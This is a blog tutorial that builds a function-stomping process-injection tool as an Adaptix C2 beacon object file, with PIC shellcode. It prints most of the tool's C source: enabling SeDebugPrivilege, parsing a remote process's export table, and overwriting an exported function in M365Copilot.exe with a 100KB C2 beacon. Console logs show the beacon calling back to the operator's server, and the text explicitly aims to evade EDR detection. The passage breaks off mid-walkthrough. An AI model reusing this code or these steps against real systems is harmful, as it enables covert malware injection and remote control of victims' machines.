---
title:  "Let's Create A Function Stomping BOF for Adaptix C2!"
header:
  teaser: "/assets/images/adaptixc2bof.png"
categories:
  - Process Injection
tags:
  - Windows 11
  - g3tsyst3m
  - '2026'
  - process injection
  - function stomping
  - module stomping
  - C2
  - Adaptix
  - PIC shellcode
  - Crystal Palace

---

If you've been following the blog for a while, you'll likely recall my [Module Stomping 101](https://g3tsyst3m.com/process%20injection/Module-Stomping-101-My-Favorite-Stomping-Grounds/) post where I walked through the classic "load a benign DLL, stomp the entry point, boom" technique. Well, I've been down that rabbit hole a little deeper since then 😸. Today we're talking about **function stomping**, a related, but meaningfully different, flavor of the same concept. We're going to build the whole thing as an **Adaptix C2 BOF** and feed it **PIC shellcode** derived from a custom coded [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) toolchain. By the end of this post you'll have a cross-process function stomper running off the beacon, and a small PIC shellcode you can drop into it that executes from wherever it lands.

Okay, let's get into it!

What is Function Stomping, Really?
-

> **In brief:** Function stomping is overwriting an **exported function** that is *already* loaded in a target process with your shellcode, and then getting that function to run - either by asking Windows to run it (`CreateRemoteThread`) or, better yet, by waiting for the target process to call it on its own.

Notice what that is *not*. It's not module stomping. In module stomping (the 101 post), **we** are the ones bringing the module into the picture: we `LoadLibrary` a benign DLL into the remote process, find its entry point, and stomp that entry point. The stomped code lives in a module *we chose* to load, at an address *we* located.

Function stomping skips all of that ceremony. There's no new module. There's no entry point. We pick a function that is **already there**. Some obscure export in a DLL the target happens to have loaded, like `RichEditWndProc` in `WinUIEdit.dll` from `M365Copilot.exe`, and we overwrite the function body itself with shellcode. The module was loaded by the OS or the application long before we showed up; we're just squatting on one of its exports. 😸

Why bother, when module stomping exists? 
-

A few reasons that have come up in my own testing:

- **No `LoadLibrary` to hide, no new module in the list.** Module stomping requires injecting a `LoadLibrary` call (usually via `CreateRemoteThread`), which is a well-understood and well-hunted primitive. Function stomping doesn't load anything.  No new entry appears in the target's module list, no `LdrLoadDll` callback fires, no load event in the EDR telemetry. The "module" is one that's already there.

- **No new memory allocation.** No `VirtualAllocEx`, no new RWX page appearing in the process. The payload is written into a code page that already exists in the target's address space. (To be fair, you do need two `VirtualProtectEx` calls - down to `PAGE_READWRITE` to write, then back up to `PAGE_EXECUTE_READWRITE`.  So, it's not literally "write to a read-only page." But you're not creating any new allocation for the EDR to see.)

- **You can skip `CreateRemoteThread` entirely.** This is my favorite part, and I'll come back to it. If you stomp a function the process will *naturally* call: a window proc, a callback, a timer.  You never need `CreateRemoteThread` at all. Execution happens "organically," in the context of the target's own thread, on its own stack, in its own thread context. `CreateRemoteThread` is one of the most heavily pattern-matched APIs in the EDR world, so having a way to not use it is genuinely nice.

The tradeoff is that you have to **choose your sacrificial function carefully**. You're overwriting a real, working function. If it's hot-path code (something called thousands of times a second) or in a critical DLL (`ntdll`, `kernel32`, `IMM32`), you will crash the process or the machine. More on choosing targets later.

TL;DR
-

- We're stomping an **existing exported function** in a **remote** process, not a freshly-loaded module's entry point.
- The technique is: enumerate the target's modules → walk the target's **PE export table from remote memory** (arch-aware!) → overwrite the chosen function with shellcode via `WriteProcessMemory` → optionally trigger with `CreateRemoteThread`.
- The end result is an **Adaptix C2 BOF**, so it runs off the beacon with a single AxScript command.
- The "subscriber bonus" payload is a **PIC shellcode** derived from **Crystal Palace**, because PIC is what lets it execute no matter which function we stomp it into: no fixed addresses, no rebasing, no loader.
- Verified: a **full 100KB Adaptix beacon** stomped into a pid of our choosing.

The Demo Stomp
-

Let's go ahead and code it out.  I created a standalone PoC that does exactly what the Adaptix C2 BOF will eventually do for us, but I'm using an actual PE executable to test.  That way we know we're on the right track!

> Compile the Stomp source code below and then we'll get started

[Source Code for stomp.exe / stomp.c](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-10-4-Function%20Stomping%20101%20-%20Adaptix%20C2%20BOFs%20and%20Crystal%20Palace%20PIC%20Shellcode/stomp_poc)

Now run it!  Oh!  but before you do, be sure to setup `Adaptix C2` to have a listener ready and also prep your shellcode.  We'll do that really quick and then run our stomp.exe

Here's what mine looks like:

<img width="1362" height="809" alt="image" src="https://github.com/user-attachments/assets/40ecb72c-9201-45b0-bb86-c9551a95f702" />

- Protocol: Any
- Config: BeaconHttp

<img width="815" height="812" alt="image" src="https://github.com/user-attachments/assets/4184df5a-8670-4270-a8b7-a0ee23b30888" />

Also, we need to generate the connectback shellcode.  Right click the listener and choose `Generate Agent`:

<img width="940" height="346" alt="image" src="https://github.com/user-attachments/assets/67191fe3-3796-4e32-b617-a7e0a0263d12" />

- Arch: x64
- Format: Shellcode

<img width="717" height="707" alt="image" src="https://github.com/user-attachments/assets/f0557546-4c6c-4141-b2b0-a9506e81ede2" />

Copy that `.bin` file to the windows box however you like. Okay, now we're ready!

Stomp it!
-

Go ahead and run your compiled `stomp.exe`

Next, we'll pick on the `M365Copilot.exe` process because it's unlikely to be heavily scrutinzed.  Go ahead and select it.

<img width="425" height="188" alt="Screenshot from 2026-10-03 17-31-32" src="https://github.com/user-attachments/assets/dec3e410-25ca-4e71-99b1-d02c3139b4cb" />

Next, let's go with the `WinUIEdit.dll` which is seldom accessed and shouldn't be interrupted by other windows services/processes accessing it.  (Notepad uses this too btw 😺)

<img width="674" height="173" alt="Screenshot from 2026-10-03 17-31-51" src="https://github.com/user-attachments/assets/cd5819cd-4695-4403-b3d8-db1b0c538f09" />

Now, we choose the Function we wish to stomp!  I chose `RichEditWndProc`

<img width="674" height="173" alt="Screenshot from 2026-10-03 17-32-09" src="https://github.com/user-attachments/assets/bfaf4c67-ca0b-424f-a981-a0a323dfda07" />

Finally, I made it very easy.  A dialog box will popup and let you choose your shellcode `.bin` file.  Go ahead and do that.  It's the shellcode you generated earlier in Adaptix.

<img width="1618" height="797" alt="Screenshot from 2026-10-03 17-32-32" src="https://github.com/user-attachments/assets/54299095-89dc-498b-9f6b-f11e8a224b93" />

Choose 'y' to use CreateRemoteThread.  At least for now.  

```bat
[*] Trigger remote thread at stomped address? [y/N]: y
[+]   Remote thread created  : handle 0x0000000000000398
[*]   Waiting for thread (10s timeout)...
[!]   Thread still running after 10s (shellcode may
      be in a loop / network callback).

========================================
  Stomp complete.
========================================
  Process : M365Copilot.exe  (PID 16360)
  Module  : WinUIEdit.dll  (base 0xf5870000)
  Function: RichEditWndProc  (addr 0xf5a2f060)
  Payload : 100351 bytes  (C:\Users\administrator\Documents\agentnew45.x64.bin)
```

Mission Accomplished!  We got our shellcode to execute the callback to our server C2 listener!

<img width="1362" height="809" alt="Screenshot from 2026-10-03 17-39-00" src="https://github.com/user-attachments/assets/e6c62f02-89e7-42ad-bdfa-ebaa9310999f" />

## Building and Running the BOF

I've included everything you need in the following source code directory to simplify things.  I just don't have time to go over all the code.  We'll leave that for my learning course in the near future 😸.  
Here's the code: [Function Stomp BOF Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-10-4-Function%20Stomping%20101%20-%20Adaptix%20C2%20BOFs%20and%20Crystal%20Palace%20PIC%20Shellcode/funcstomp_bof)

Run the commands below to make the funcstomp BOF:

```bash
cd funcstomp_bof
make
```

Next, go into your Adaptix C2 console, Extensions, Script Manager, and add / enable it!:

<img width="808" height="148" alt="image" src="https://github.com/user-attachments/assets/a48741cf-d33f-4ba7-8f98-4ab49f36035a" />

Select your funcstomp.axs script!

<img width="808" height="148" alt="image" src="https://github.com/user-attachments/assets/1b16b660-031d-4622-bb0e-fb04995d2564" />

<img width="1215" height="868" alt="image" src="https://github.com/user-attachments/assets/b5ade8ff-eaaf-4130-b019-c1597319b84e" />

It's now ready to use!

Enter into the Console session for one of your connected agents.  Next, enter the following command to execute your BOF (adjust your .bin directory accordingly, of course 😸):

```bat
stomp [PID] "WinUIEdit.dll" "RichEditWndProc" /home/g3tsyst3m/agent.x64.bin -t 1
```

You should see the following output, similar to mine:

```bat
[03/10 20:53:01] Operator1 [b3a37db9] beacon > stomp -p 14308 -d WinUIEdit.dll -f RichEditWndProc -s /home/g3tsyst3m/AdaptixProjects/g3t_main/agentnew45.x64.bin -t 1
[03/10 20:53:01] [*] Task: FuncStomp
[03/10 20:53:02] [*] Agent called server, sent [103.73 Kb]
[03/10 20:53:07] [+] BOF output
[*] funcstomp: pid=14308 dll=WinUIEdit.dll func=RichEditWndProc sc=100351 bytes trigger=1
[+] funcstomp: WinUIEdit.dll base=0x7ffd2a830000
[+] funcstomp: 'RichEditWndProc' @ 0x7ffd2a9edbe0
[+] funcstomp: stomped 100351 bytes (old prot 0x20)
[+] funcstomp: remote thread created
[*] funcstomp: thread still running (5s timeout, shellcode alive)
[=] funcstomp: done â€” WinUIEdit.dll::RichEditWndProc in PID 14308
[03/10 20:53:07] [+] BOF finished
```

<img width="1215" height="868" alt="image" src="https://github.com/user-attachments/assets/9ac07e94-b4eb-4c1e-a580-348262b350e1" />

That's it!


Crystal Palace PIC ShellCode (🎁 Bonus Subscriber Only Offering 🎁)
-

If you've read my [PIC Shellcode from the Ground Up](https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-1/) series, you know my feelings about PIC: it's the right tool for shellcode that has to run *anywhere*. For function stomping specifically, PIC is essentially mandatory. We're dropping into the middle of some arbitrary DLL's `.text` section, at an address we did not choose and that changes every run (ASLR). Any absolute address in the payload is a landmine. PIC will resolve everything at runtime relative to our own location.  This is what makes the same `.bin` work whether we stomp it into `explorer.exe` or Notepad, etc.

**Crystal Palace** is the C2 + shellcode toolchain I've been building in parallel with the stomping work. The relevant piece here is its PIC generator: it takes a C source, emits PIC-friendly assembly (no absolute addresses, no `.data` section: constants are pushed to the runtime stack and located relative to `RSP`), and assembles it into a position-independent `.bin`. The beacon itself is PIC; the small shellcodes we use for stomping are PIC too. 

A quick note on what "PIC-derived" means concretely in this context, because it's the part I'd expect questions about:

- **DFR (Dynamic Function Resolution).** The shellcode resolves its own imports (kernel32/advapi32/etc.) at runtime by hashing export names and walking the loaded DLL list:no import table, no fixed base. This is the same `MODULE$Func` / ror13 hashing scheme the Adaptix beacon uses, which is part of why the two play so nicely together.
- **No `.data`, everything relative.** Strings and constants live as immediate pushes and are addressed off the stack, so the code is literally the same byte stream no matter where it lands.
- **PEB/LDR walking** for module bases, so even "where is kernel32" is answered at runtime.

The actual payload I've been pushing through the stomper in testing is a small beacon-style checkin stub (a few hundred bytes): big enough to do a real handshake with the server, small enough that it fits comfortably inside a single function body without eating its neighbors. For the full-beacon tests (100KB+), I used the standard Adaptix beacon `.bin`, which is PIC in the same way.

Here's the code (🎁 Subscriber Only Perk 🎁): [Source Code Bundle](https://ko-fi.com/s/f4c3282bb3) 

Here's how to compile the PIC:

```bat
cd crystalpalace_files
make adaptix 
```

Here's how to use it after you add it to the Adaptix C2 Script manager:

```bat
  stomp_pic                     Stomp a function in a target process (Crystal Palace PIC)

+-------------------------------------------------------------------------------------+
[04/10 14:57:47] [*] Stomping RichEditWndProc in WinUIEdit.dll (PID 18028) via PIC...

[04/10 14:57:47] Operator1 [738ca289] beacon > stomp_pic -p 18028 -d WinUIEdit.dll -f RichEditWndProc -s /home/g3tsyst3m/AdaptixProjects/g3t_main/agentnew45.x64.bin -t 1
[04/10 14:57:47] [*] Task: FuncStomp-PIC
[04/10 14:57:49] [*] Agent called server, sent [107.06 Kb]
[04/10 14:57:54] [+] BOF output
[*] stomprun: PIC 7023 bytes; stomp 100351 bytes into WinUIEdit.dll::RichEditWndProc (pid 18028, trigger 1)
[*] stomprun: calling PIC at 0x000001E839D30000 (arg blob at offset 7023)
[+] stomprun: PIC returned
[04/10 14:57:54] [+] BOF finished
```

<img width="1511" height="357" alt="Screenshot from 2026-10-04 14-58-34" src="https://github.com/user-attachments/assets/889fcd79-649d-4677-87e1-4a4d0fd4fffa" />

<img width="1338" height="312" alt="Screenshot from 2026-10-04 15-00-14" src="https://github.com/user-attachments/assets/fe8c45b2-3917-42bb-995f-0c10ae24b909" />


And That's It!

The Detailed Walkthrough for the Function Stomping BOF for those Who wish to Dive Deeper!
-

I used a Windows 11 VM in my home lab with EDR disabled for testing, and the Adaptix server listening on my Ubuntu 24.04 box. 

Building the Function Stomping BOF with Adaptix C2
-

For those not deep in the Adaptix world yet: Adaptix is a C2 framework that, among other things, runs **BOFs** (Beacon Object Files) - small COFF objects that get loaded *inside* the beacon process. The beacon provides you with its own little stdlib (the `BeaconFunctions[]` table): `BeaconPrintf`, `BeaconDataInt`, `BeaconDataExtract`, and so on, plus a `MODULE$` / `KERNEL32$` dynamic function resolution (DFR) scheme for pulling in Windows APIs without a traditional import table. If that sounds like a lot of jargon, the [Adaptix documentation](https://adaptix.github.io/adaptix-c2-docs/) is where I point people, but the parts that matter for this post are:

1. BOFs are written in C, built with the MSVCRT toolchain to x64/x86 `.o` files, and loaded by the beacon via a custom loader.
2. You **cannot** just use any libc function you like. The beacon's function table is a **fixed 32 entries**, and anything not in it will fail at load time. Allocation is `MSVCRT$malloc`/`MSVCRT$free` (resolved via the `$` DFR path). There is no `calloc`, no `lstrcpynA`, and `FindProcBySymbol` in `bof_loader.cpp` will flat-out reject any symbol name that is too short to resolve. So if you're adapting BOF code from elsewhere, audit every libc call first.
3. Token/privilege APIs live in **`ADVAPI32$`**, not `KERNEL32$`. `AdjustTokenPrivileges`, `OpenProcessToken`, `LookupPrivilegeValueA`, which are all advapi32. The `$` DFR path does a `LoadLibraryA` + `GetProcAddress`, so if you write `KERNEL32$AdjustTokenPrivileges` you'll get "Symbol not found," because kernel32 simply doesn't export it. I hit this one and lost an hour to it 😸.

The flow of the BOF (`funcstomp.c`, source in the repo linked below) is straightforward:

## Overview

```
┌──────────────┐    BOF injection     ┌────────────────────┐
│  C2 Beacon   │─────────────────────▶│  Target Process    │
│  (beacon.exe)│                      │  (explorer.exe, etc.)
│              │  OpenProcess         │                    │
│              │  ReadProcessMemory   │  Target DLL loaded │
│              │  VirtualProtectEx    │  (e.g. WinUIEdit.dll)
│              │  WriteProcessMemory  │  ┌───────────────┐ │
│              │  CreateRemoteThread  │  │ Export Table  │ │
│              │                      │  │               │ │
└──────────────┘                      │  │ func ──▶ RW   │ │
                                      │  │       ──▶ shellcode
                                      │  │       ──▶ RX  │ │
                                      │  └───────────────┘ │
                                      └────────────────────┘
```

The BOF runs **inside** the beacon process. It reaches into a *different* process, finds a DLL's export table, locates a chosen export, changes its memory protection to read/write, overwrites the first N bytes with shellcode, sets protection back to executable, and optionally spawns a remote thread to execute the shellcode in-place.

---

## File Structure

| Section | Lines | Purpose |
|---------|-------|---------|
| Header comment | 1–24 | Docs: params, symbol resolution notes |
| DFR imports | 30–55 | All WinAPI/CRT functions resolved via DFR |
| Constants & types | 62–79 | Max sizes, `export_entry_t` struct |
| Helpers | 84–112 | `xread`, `strcasecmp_a`, `cpyn` |
| SeDebugPrivilege | 118–141 | Elevate debug access (best-effort) |
| find_module_base | 147–168 | Locate a DLL's base address in target |
| read_exports | 174–261 | Walk the remote PE export table |
| go() (entry point) | 267–419 | Main logic: validate → find → stomp → trigger |

---

### 1. DFR Imports (Lines 34–55)

The BOF runs inside a beacon that strips normal symbols. All API calls are declared with `DECLSPEC_IMPORT` and a `MODULE$Function` naming convention so the beacon's DFR (Dynamic Function Resolution) loader can resolve them at runtime:

```c
/* kernel32 */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, DWORD *lpflOldProtect);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Module32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode);

/* advapi32 - token/privilege (NOT in kernel32) */
DECLSPEC_IMPORT HANDLE WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);

/* msvcrt - beacon does NOT provide calloc/free */
DECLSPEC_IMPORT void *WINAPI MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void  WINAPI MSVCRT$free(void *ptr);
```

**Why DFR?** The beacon's `bof_loader.cpp` resolves symbols via two paths:
- `MODULE$Func` → `LoadLibraryA(module)` + `GetProcAddress(module, func)`
- `__imp_Beacon*` → Djb2A-hashed against the fixed 32-entry `BeaconFunctions[]` table

`calloc`/`free`/`lstrcpynA` are **not** in that table, so the BOF must use msvcrt's `malloc`/`free` and inline string helpers instead.

### 2. Constants & Types (Lines 66–79)

```c
#define MAX_EXPORTS    8192
#define MAX_NAME_LEN   256
#define SE_DEBUG_LUID  _SE_DEBUG_PRIVILEGE  /* 0x14 */

typedef struct {
    char      name[MAX_NAME_LEN];
    WORD      ordinal;
    DWORD     rva;
    DWORD_PTR addr;
} export_entry_t;
```

The `export_entry_t` struct holds one row of the export table. The `addr` field is `base + rva` (absolute address in the target).

### 3. Helper Functions (Lines 85–112)

```c
static SIZE_T xread(HANDLE hProc, DWORD_PTR addr, void *buf, SIZE_T size)
{
    SIZE_T n = 0;
    if (!KERNEL32$ReadProcessMemory(hProc, (LPCVOID)addr, buf, size, &n))
        return 0;
    return n;
}
```
Thin wrapper around `ReadProcessMemory`. Returns bytes read, or 0 on failure. Used throughout to read PE structures from the target process.

```c
static int strcasecmp_a(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return (unsigned char)*a - (unsigned char)*b;
}
```
ASCII-only case-insensitive compare. Avoids CRT dependency.

```c
static void cpyn(char *dst, const char *src, int max)
{
    int i = 0;
    for (i = 0; i < max - 1 && src[i] != '\0'; i++)
        dst[i] = src[i];
    dst[i] = '\0';
}
```
Bounded null-terminated copy. Replaces `lstrcpynA` which isn't available in the beacon.

### 4. `enable_se_debug()` (Lines 118–141)

```c
static void enable_se_debug(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                   &hToken))
        return;

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        KERNEL32$CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    /* Best-effort: if it fails we just can't access SYSTEM processes */
}
```

Opens the current process token, looks up `SeDebugPrivilege` (LUID 0x14), and enables it. This grants the beacon access to SYSTEM-level processes. Failing silently is intentional - a non-admin beacon can still stomp user-level processes without it.

### 5. `find_module_base()` (Lines 147–168)

```c
static DWORD_PTR find_module_base(DWORD pid, const char *dll_name)
{
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE || snap == NULL)
        return 0;

    MODULEENTRY32 me;
    me.dwSize = sizeof(me);

    DWORD_PTR base = 0;
    if (KERNEL32$Module32First(snap, &me)) {
        do {
            if (strcasecmp_a(me.szModule, dll_name) == 0) {
                base = (DWORD_PTR)me.modBaseAddr;
                break;
            }
        } while (KERNEL32$Module32Next(snap, &me));
    }

    KERNEL32$CloseHandle(snap);
    return base;
}
```

Uses the **Toolhelp32 Module Snapshot** to enumerate all modules loaded in the target PID. Returns the loaded base address (`modBaseAddr`) of the named DLL. This works regardless of ASLR because it reads the *actual* mapped address from the target's module list.

### 6. `read_exports()` (Lines 174–261) - PE Export Table Walker

The most complex function. Reads the PE headers **remotely** (via `ReadProcessMemory`) to parse the export directory. Architecture-agnostic (handles both PE32 and PE32+).

```
Target process memory layout:

  base ──► IMAGE_DOS_HEADER
              │ e_lfanew
              ▼
           NT_SIGNATURE + IMAGE_FILE_HEADER
              │
              ▼
           IMAGE_OPTIONAL_HEADER
              │  DataDirectory[0] = Export
              ▼
           IMAGE_EXPORT_DIRECTORY
              ├── NumberOfFunctions
              ├── NumberOfNames
              ├── AddressOfFunctions   (RVA → DWORD[])
              ├── AddressOfNames       (RVA → DWORD[])
              └── AddressOfNameOrdinals (RVA → WORD[])
```

#### Step 1–2: DOS & NT headers (Lines 177–188)

```c
    /* 1. DOS header */
    IMAGE_DOS_HEADER dos;
    if (xread(hProc, base, &dos, sizeof(dos)) != sizeof(dos))
        return -1;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE)
        return -1;

    /* 2. NT signature */
    DWORD_PTR nt_addr = base + dos.e_lfanew;
    DWORD sig;
    if (xread(hProc, nt_addr, &sig, 4) != 4 || sig != IMAGE_NT_SIGNATURE)
        return -1;
```

Reads the "MZ" header, follows the `e_lfanew` pointer to the "PE\0\0" signature.

#### Step 3: Optional header magic (Lines 190–198)

```c
    /* 3. Optional header magic (2 bytes at offset 24 from NT start) */
    WORD opt_magic;
    DWORD_PTR opt_hdr_addr = nt_addr + 4 + sizeof(IMAGE_FILE_HEADER); /* = 24 */
    if (xread(hProc, opt_hdr_addr, &opt_magic, 2) != 2)
        return -1;

    int is_64 = (opt_magic == 0x20b);
    int dd_off = is_64 ? 112 : 96;
    DWORD_PTR dd_addr = opt_hdr_addr + dd_off;
```

The optional header magic (`0x20b` = PE32+, `0x10b` = PE32) determines where the `DataDirectory` array lives - offset 112 for 64-bit, 96 for 32-bit.

#### Step 4–5: Export directory (Lines 200–216)

```c
    /* 4. Export directory entry (index 0) */
    IMAGE_DATA_DIRECTORY edd;
    if (xread(hProc, dd_addr, &edd, sizeof(edd)) != sizeof(edd))
        return -1;
    if (edd.VirtualAddress == 0 || edd.Size == 0)
        return 0;  /* no exports in this module */

    /* 5. IMAGE_EXPORT_DIRECTORY */
    IMAGE_EXPORT_DIRECTORY ied;
    DWORD_PTR ied_addr = base + edd.VirtualAddress;
    if (xread(hProc, ied_addr, &ied, sizeof(ied)) != sizeof(ied))
        return -1;

    DWORD nfuncs = ied.NumberOfFunctions;
    DWORD nnames = ied.NumberOfNames;
    if (nfuncs == 0 || nnames == 0)
        return 0;
```

Gets the export directory's RVA and size, then reads the `IMAGE_EXPORT_DIRECTORY` struct to learn how many functions/names exist.

#### Step 6: Heap-allocate & read the three arrays (Lines 220–231)

```c
    /* 6. Read arrays (heap-allocated: these are too big for the beacon's 1MB stack) */
    DWORD *funcs    = (DWORD *)MSVCRT$malloc(nfuncs * sizeof(DWORD));
    DWORD *names    = (DWORD *)MSVCRT$malloc(nnames * sizeof(DWORD));
    WORD  *ordinals = (WORD  *)MSVCRT$malloc(nnames * sizeof(WORD));
    if (!funcs || !names || !ordinals) {
        MSVCRT$free(funcs); MSVCRT$free(names); MSVCRT$free(ordinals);
        return -1;
    }

    if (xread(hProc, base + ied.AddressOfFunctions,    funcs,    nfuncs * sizeof(DWORD)) != nfuncs * sizeof(DWORD)) { ... }
    if (xread(hProc, base + ied.AddressOfNames,        names,    nnames * sizeof(DWORD)) != nnames * sizeof(DWORD)) { ... }
    if (xread(hProc, base + ied.AddressOfNameOrdinals, ordinals, nnames * sizeof(WORD))  != nnames * sizeof(WORD))  { ... }
```

The three tables are read from the target process into heap memory. For a DLL like `ntdll.dll` (~2000 exports), this is ~28 KB - fine on heap, but the *caller's* output array (`export_entry_t[8192]` ≈ 512 KB) would also blow the 1 MB stack.

#### Step 7: Build entries (Lines 233–255)

```c
    /* 7. Build entries */
    int count = 0;
    for (DWORD i = 0; i < nread; i++) {
        WORD ord_idx = ordinals[i];
        if (ord_idx >= nfuncs) continue;

        DWORD func_rva = funcs[ord_idx];

        /* Skip forwarded exports */
        if (func_rva >= edd.VirtualAddress &&
            func_rva <  edd.VirtualAddress + edd.Size)
            continue;

        char namebuf[MAX_NAME_LEN] = {0};
        if (xread(hProc, base + names[i], namebuf, MAX_NAME_LEN - 1) == 0)
            continue;

        cpyn(out[count].name, namebuf, MAX_NAME_LEN);
        out[count].ordinal = ord_idx;
        out[count].rva     = func_rva;
        out[count].addr    = base + func_rva;
        count++;
    }
```

For each named export:
- Resolves the function RVA via the ordinal index
- **Skips forwarded exports** (where the RVA points back into the export directory itself - these are stubs that redirect to another module)
- Reads the name string from the target
- Stores name, ordinal, RVA, and absolute address (`base + rva`)

### 7. `go()` - Entry Point (Lines 267–419)

#### Phase A: Parse Parameters (Lines 267–277)

```c
int go(char *args, unsigned long length)
{
    datap p;
    BeaconDataParse(&p, args, (int)length);

    int         pid       = BeaconDataInt(&p);
    char       *dll_name  = (char *)BeaconDataExtract(&p, NULL);
    char       *func_name = (char *)BeaconDataExtract(&p, NULL);
    int         sc_len    = 0;
    char       *shellcode = (char *)BeaconDataExtract(&p, &sc_len);
    int         trigger   = BeaconDataInt(&p);
```

| Param | Type | Description |
|-------|------|-------------|
| `pid` | int | Target process ID |
| `dll_name` | cstr | Module name (e.g. `"WinUIEdit.dll"`) |
| `func_name` | cstr | Export to stomp (e.g. `"RichEditWndProc"`) |
| `shellcode` | bytes | Payload (base64 in transit, decoded by `BeaconDataExtract`) |
| `trigger` | int | 1 = `CreateRemoteThread`, 0 = stomp only |

#### Phase B: Validation (Lines 283–298)

```c
    if (pid <= 0) { ... return 1; }
    if (!dll_name || !func_name) { ... return 1; }
    if (!shellcode || sc_len <= 0) { ... return 1; }
    if (sc_len > 0x100000) { ... return 1; }  /* 1 MB cap */
```

#### Phase C: SeDebug + Module Lookup (Lines 300–309)

```c
    enable_se_debug();

    DWORD_PTR mod_base = find_module_base((DWORD)pid, dll_name);
    if (!mod_base) {
        BeaconPrintf(CALLBACK_ERROR, "[!] funcstomp: module '%s' not found in PID %d\n", dll_name, pid);
        return 2;
    }
```

#### Phase D: Open Process (Lines 312–319)

```c
    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, (DWORD)pid);
```

| Access right | What it allows |
|---|---|
| `PROCESS_VM_READ` | `ReadProcessMemory` |
| `PROCESS_VM_WRITE` | `WriteProcessMemory` |
| `PROCESS_VM_OPERATION` | `VirtualProtectEx` |
| `PROCESS_QUERY_INFORMATION` | General queries |

#### Phase E: Read Exports & Find Target (Lines 322–354)

```c
    export_entry_t *exports = (export_entry_t *)MSVCRT$malloc(MAX_EXPORTS * sizeof(export_entry_t));
    // ...
    int nexports = read_exports(hProc, mod_base, exports, MAX_EXPORTS);
    // ...
    DWORD_PTR func_addr = 0;
    for (int i = 0; i < nexports; i++) {
        if (strcasecmp_a(exports[i].name, func_name) == 0) {
            func_addr = exports[i].addr;
            break;
        }
    }
    // ...
    MSVCRT$free(exports);  /* only need func_addr now */
```

Linear search through up to 8192 exports. The array is freed immediately after - only the resolved address matters.

#### Phase F: The Stomp (Lines 356–389)

```c
    /* --- Stomp: RW -> write -> RX --- */
    DWORD old_prot = 0;

    // Step 1: Make the function code writable
    if (!KERNEL32$VirtualProtectEx(hProc, (LPVOID)func_addr, (SIZE_T)sc_len,
                                    PAGE_READWRITE, &old_prot))
    { ... return 7; }

    // Step 2: Overwrite with shellcode
    SIZE_T written = 0;
    if (!KERNEL32$WriteProcessMemory(hProc, (LPVOID)func_addr, shellcode,
                                      (SIZE_T)sc_len, &written))
    { ... return 8; }

    // Step 3: Restore execute permission (RWX)
    DWORD old_prot2 = 0;
    if (!KERNEL32$VirtualProtectEx(hProc, (LPVOID)func_addr, (SIZE_T)sc_len,
                                    PAGE_EXECUTE_READWRITE, &old_prot2))
    { ... return 9; }
```

Three-step in-place code modification:

